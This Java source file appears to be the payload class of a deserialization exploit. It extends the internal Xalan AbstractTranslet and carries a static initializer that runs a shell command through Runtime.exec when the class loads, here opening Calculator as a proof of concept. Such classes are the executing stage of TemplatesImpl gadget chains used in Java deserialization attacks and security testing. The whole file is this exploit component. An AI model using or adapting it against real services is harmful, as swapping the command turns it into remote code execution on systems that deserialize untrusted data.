package com.sorry.utils.templatesimpl;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;


/**
 * created by 0x22cb7139 on 2021/6/29
 */
public class CustomAbstractTranslet extends AbstractTranslet {
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    static {
        try{
            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","open /System/Applications/Calculator.app"});
        }catch (Exception e){}

    }
}
